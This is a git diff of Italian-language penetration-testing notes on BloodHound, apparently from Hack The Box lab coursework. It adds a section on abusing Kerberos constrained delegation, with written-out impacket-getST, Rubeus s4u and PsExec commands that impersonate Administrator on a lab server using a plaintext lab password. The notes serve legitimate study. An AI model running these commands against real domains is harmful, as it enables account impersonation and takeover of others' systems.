@@ -1,7 +1,7 @@
 # BloodHound
 
 - [BloodHound](#bloodhound)
-  - [Installation](#installation)
+  - [Installazione](#installazione)
   - [Attacchi](#attacchi)
     - [ForceChangePassword](#forcechangepassword)
     - [CanRDP, CanPSRemote, ExecuteDCOM](#canrdp-canpsremote-executedcom)
@@ -18,13 +18,19 @@
         - [Opzione 4 – Dumping credenziali (il vero valore di AdminTo)](#opzione-4--dumping-credenziali-il-vero-valore-di-adminto)
     - [AddMember](#addmember)
       - [Differenza con AddSelf](#differenza-con-addself)
+    - [AllowedToDelegate](#allowedtodelegate)
+      - [Come funziona concettualmente](#come-funziona-concettualmente)
+      - [Come abusarlo?](#come-abusarlo)
+        - [Perché è così potente?](#perché-è-così-potente)
+        - [Constrained vs Unconstrained Delegation](#constrained-vs-unconstrained-delegation)
+
 
 BloodHound usa Graph Theory.
 ![alt text](images/bloodhound/graphBloodHound1.png)
 
 Grace è membro di SQL Admins.
 
-## Installation
+## Installazione
 TODO Prima o poi lo scriverò...
 
 
@@ -199,5 +205,57 @@ Get-DomainGroupMember -Identity 'ITManagers' -Credential $Cred
 
 `AddMembers` è più potente perché puoi aggiungere anche altri utenti, non solo te stesso.
 
+
+### AllowedToDelegate
+AllowedToDelegate è un privilegio di Kerberos Constrained Delegation. Significa che Ester può impersonare qualsiasi utente quando accede a SRV01.
+![alt text](images/bloodhound/AllowedToDelegate.png)
+
+- Da Ester lo trovi sotto **Constrained Delegation Privileges**.
+- Pre-build query: **Find Computers with Constrained Delegation**
+
+#### Come funziona concettualmente
+```
+Normalmente:
+Utente → autentica se stesso → SRV01
+
+Con Constrained Delegation:
+Ester → impersona Domain Admin → SRV01
+"Sto accedendo a SRV01 per conto di Domain Admin"
+```
+AD si fida di Ester per fare questo, quindi le permette di richiedere ticket Kerberos per conto di altri utenti, limitatamente a SRV01.
+
+#### Come abusarlo?
+L'obiettivo è impersonare un utente privilegiato (es. Administrator) su SRV01.
+
+Da Linux con impacket:
+```
+# 1. Richiedi un ticket per Administrator su SRV01 impersonandolo come Ester
+impacket-getST -spn cifs/SRV01.INLANEFREIGHT.HTB \
+  -impersonate Administrator \
+  INLANEFREIGHT.HTB/ester:Password15
+
+# 2. Usa il ticket ottenuto
+export KRB5CCNAME=Administrator.ccache
+
+# 3. Accedi a SRV01 come Administrator
+impacket-psexec -k -no-pass SRV01.INLANEFREIGHT.HTB
+```
+
+Da Windows con Rubeus:
+```
+# 1. Richiedi il ticket
+.\Rubeus.exe s4u /user:ester /password:Password15 /impersonateuser:Administrator /msdsspn:cifs/SRV01.INLANEFREIGHT.HTB /ptt
+
+# 2. Ora hai il ticket in memoria, accedi
+.\PsExec.exe \\SRV01 cmd.exe
+
+# Puoi accedere anche in altri modi, tipo con winrs
+```
+
+##### Perché è così potente?
+![alt text](images/bloodhound/allowedToDelegate_potente.png)
+
+##### Constrained vs Unconstrained Delegation
+![alt text](images/bloodhound/ConstrainedvsUnconstrainedDelegation.png)
 
 
